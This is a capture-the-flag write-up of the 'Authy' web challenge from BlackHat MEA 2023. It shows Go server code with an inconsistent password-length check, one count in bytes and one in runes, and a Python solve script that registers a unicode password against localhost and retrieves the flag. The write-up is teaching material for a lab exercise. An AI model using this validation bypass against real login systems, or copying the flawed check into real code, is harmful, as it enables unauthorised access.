# Web - Authy

## Download&#x20;

* If you wanna try out the chall files are here : [https://github.com/heapbytes/CTFs/tree/main/2023/BlackHat-MEA-CTF/web](https://github.com/heapbytes/CTFs/tree/main/2023/BlackHat-MEA-CTF/web)
* Password : `flagyard`

## Challenge files

```bash
.
├── black.db
├── controller
│   └── LoginController.go
├── db
│   └── dbConnection.go
├── docker-compose.yml
├── Dockerfile
├── go.mod
├── go.sum
├── helper
│   └── util.go
├── model
│   └── models.go
└── server.go

5 directories, 10 files
```



## server.go

```go
package main

import (
        "net/http"
        "time"

        controllers "github.com/blackhat/controller"
        "github.com/labstack/echo/v4"
        "github.com/labstack/echo/v4/middleware"
)

func main() {
        e := echo.New()

        // e.Use(middleware.Logger())
        e.Use(middleware.Recover())

        e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
                AllowOrigins: []string{"*"},
                AllowMethods: []string{echo.GET, echo.POST},
        }))

        e.POST("/login", controllers.LoginController)
        e.POST("/registration", controllers.Registration)
        s := &http.Server{
                Addr:         ":1323",
                ReadTimeout:  20 * time.Minute,
                WriteTimeout: 20 * time.Minute,
        }
        e.Logger.Fatal(e.StartServer(s))
}
```

Looking at the file we can say it's nothing but just a general login/registeration index file.



* The intresting file was under `controller/LoginController.go`
* The main fact to get the `flag` was to have a password of length less than 6 (checkout following snippet).

```go
        if len(password) < 6 {
                flag := os.Getenv("FLAG")
                res := &Flag{
                        Flag: flag,
                }
                resp := c.JSON(http.StatusOK, res)
                log.Info()
                return resp
        }
```

* BUT BUT BUT, while registering we see that the request isn't sent to register if our password length is less than 6 (check the following snippet).

```go
if len(user.Password) < 6 {
        log.Error("Password too short")
        resp := c.JSON(http.StatusConflict, helper.ErrorLog(http.StatusConflict, "Password too short", "EXT_REF"))
        return resp
}
```



## Vulnerability - Rune

* If you looked the src code closely,&#x20;

```go
password := []rune(user.Password)
result.Token = helper.JwtGenerator(result.Username, result.Firstname, result.Lastname, os.Getenv("SECRET"))
```

* It's using r**une** to check the length of the password.
* What's rune ?&#x20;
  * tl;dr : it's basically used for unicode characters
* Read more here :&#x20;
  * [https://www.geeksforgeeks.org/rune-in-golang/](https://www.geeksforgeeks.org/rune-in-golang/)
  * [https://go.dev/blog/strings](https://go.dev/blog/strings)



### Exploit

* So what next?&#x20;
  * Just create a password with unicode character of length more than 6
  * while checking with run the length of our unicode character would be 1 or whatever character code you used.

### Solve.py

```python
import requests

url = 'http://localhost:1323/'
username, password = 'FlagGrabberLocal', '\u23188888'

# register
req = requests.post(url + 'registration', json={"Username": username, "Password": password})
print(req.content, '\n')

# flag grabinggg
req = requests.post(url + 'login', json={"Username": username, "Password": password})
print(req.content)
```

## Flag

```bash
└─➜ python3 solve.py                                                                                                                                                                     [0]
b'{"username":"FlagGrabberLocal","password":"$2a$05$vsvJGNY6CNvld4eIaaJjy.h0DI/ROoc2UC2eiaWGsSq0Ow4yBYnJC","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiIiLCJsYXN0bmFtZSI6IiIsInVzZXJuYW1lIjoiRmxhZ0dyYWJiZXJMb2NhbCJ9.QDC0wMT-pDtJAGPkEBymdeJCm_EV5l-CJcWstKMD66I","date_created":"2023-10-24 15:33:35"}\n'

b'{"flag":"BHFlagY{this_is_a_flag}"}\n'
```



\-------- and pwned (late writeup? yehp)











